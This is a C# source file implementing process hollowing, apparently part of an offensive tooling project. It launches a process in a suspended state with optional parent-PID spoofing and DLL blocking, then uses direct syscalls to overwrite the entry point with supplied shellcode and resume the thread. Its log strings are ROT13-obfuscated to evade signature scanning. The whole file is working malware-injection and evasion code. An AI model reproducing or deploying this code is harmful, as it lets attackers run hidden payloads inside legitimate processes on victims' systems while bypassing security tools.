//start
using System.Text;
using System.Linq;
using System;
﻿
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace McChicken
{
    class ProcessHollowing
    {
        public static void Execute(byte[] shellcode, string processImage, int ppid = 0, bool blockDlls = false, bool am51 = false, bool debug = false)
        {
            #region CreateProcessA

            var pi = SpawnProcess.Execute(
                processImage,
                new string(@"P:\Jvaqbjf\Flfgrz32".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()),
                suspended: true,
                ppid: ppid,
                blockDlls: blockDlls,
                am51: am51);

            #endregion

            #region NtQueryInformationProcess

            IntPtr hProcess = pi.hProcess;
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint returnLength = 0;
            var ntstatus = Syscalls.NtQueryInformationProcess(
                hProcess,
                PROCESSINFOCLASS.ProcessBasicInformation,
                ref bi,
                (uint)(IntPtr.Size * 6),
                ref returnLength);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(CebprffUbyybjvat) [+] AgDhrelVasbezngvbaCebprff".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(ProcessHollowing) [-] NtQueryInformationProcess: {ntstatus}");

            #endregion

            #region NtReadVirtualMemory
            IntPtr ptrImageBaseAddress = (IntPtr)((Int64)bi.PebBaseAddress + 0x10);
            IntPtr baseAddress = Marshal.AllocHGlobal(IntPtr.Size);

            uint bytesRead = 0;
            ntstatus = Syscalls.NtReadVirtualMemory(
                hProcess,
                ptrImageBaseAddress,
                baseAddress,
                (uint)IntPtr.Size,
                ref bytesRead);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(CebprffUbyybjvat) [+] AgErnqIveghnyZrzbel".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(ProcessHollowing) [-] NtReadVirtualMemory: {ntstatus}");

            byte[] baseAddressBytes = new byte[bytesRead];
            Marshal.Copy(baseAddress, baseAddressBytes, 0, (int)bytesRead);
            Marshal.FreeHGlobal(baseAddress);
            IntPtr imageBaseAddress = (IntPtr)(BitConverter.ToInt64(baseAddressBytes, 0));
            IntPtr data = Marshal.AllocHGlobal(0x200);

            bytesRead = 0;
            ntstatus = Syscalls.NtReadVirtualMemory(
                hProcess,
                imageBaseAddress,
                data,
                0x200,
                ref bytesRead);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(CebprffUbyybjvat) [+] AgErnqIveghnyZrzbel".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(ProcessHollowing) [-] NtReadVirtualMemory: {ntstatus}");

            byte[] dataBytes = new byte[bytesRead];
            Marshal.Copy(data, dataBytes, 0, (int)bytesRead);
            Marshal.FreeHGlobal(data);
            uint e_lfanew = BitConverter.ToUInt32(dataBytes, 0x3C);
            uint entrypointRvaOffset = e_lfanew + 0x28;
            uint entrypointRva = BitConverter.ToUInt32(dataBytes, (int)entrypointRvaOffset);
            IntPtr entrypointAddress = (IntPtr)((UInt64)imageBaseAddress + entrypointRva);

            #endregion

            #region NtProtectVirtualMemory (PAGE_EXECUTE_READWRITE)

            IntPtr protectAddress = entrypointAddress;
            IntPtr regionSize = (IntPtr)shellcode.Length;
            uint oldProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE,
                ref oldProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(CebprffUbyybjvat) [+] AgCebgrpgIveghnyZrzbel, CNTR_RKRPHGR_ERNQJEVGR".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(ProcessHollowing) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READWRITE: {ntstatus}");

            #endregion

            #region NtWriteVirtualMemory (shellcode)

            var buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);

            uint bytesWritten = 0;
            ntstatus = Syscalls.NtWriteVirtualMemory(
                hProcess,
                entrypointAddress,
                buffer,
                (uint)shellcode.Length,
                ref bytesWritten);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(CebprffUbyybjvat) [+] AgJevgrIveghnyZrzbel, furyypbqr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(ProcessHollowing) [-] NtWriteVirtualMemory, shellcode: {ntstatus}");

            #endregion

            #region NtProtectVirtualMemory (oldProtect)

            protectAddress = entrypointAddress;
            regionSize = (IntPtr)shellcode.Length;
            uint tmpProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                oldProtect,
                ref tmpProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(CebprffUbyybjvat) [+] AgCebgrpgIveghnyZrzbel, byqCebgrpg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(ProcessHollowing) [-] NtProtectVirtualMemory, oldProtect: {ntstatus}");

            #endregion

            #region NtResumeThread

            uint suspendCount = 0;

            ntstatus = Syscalls.NtResumeThread(
                pi.hThread,
                ref suspendCount);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(CebprffUbyybjvat) [+] AgErfhzrGuernq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(ProcessHollowing) [-] NtResumeThread: {ntstatus}");

            #endregion

            Syscalls.NtClose(pi.hThread);
            Syscalls.NtClose(hProcess);
        }
    }
}
